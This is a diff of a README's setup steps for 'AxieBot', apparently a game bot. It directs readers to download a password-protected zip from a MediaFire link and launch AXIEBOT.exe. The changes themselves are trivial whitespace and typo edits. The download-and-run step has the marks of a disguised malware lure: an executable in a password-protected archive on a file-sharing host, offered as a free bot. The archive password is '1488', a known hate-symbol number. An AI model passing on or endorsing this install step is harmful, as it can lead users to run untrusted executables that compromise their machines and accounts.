@@ -7,9 +7,9 @@ Setup
 
 2.Download archive with software https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file Password:1488
 
-3.Launch AXIEBOT.exe with correct settings
+3.Launch AXIEBOT.exe with correct settings 
 
-Warning
+Warnin
 Im not recommend you to play more than 24 hours per account. Im not take responsibility for any bans or blocks.
 
 Copyright
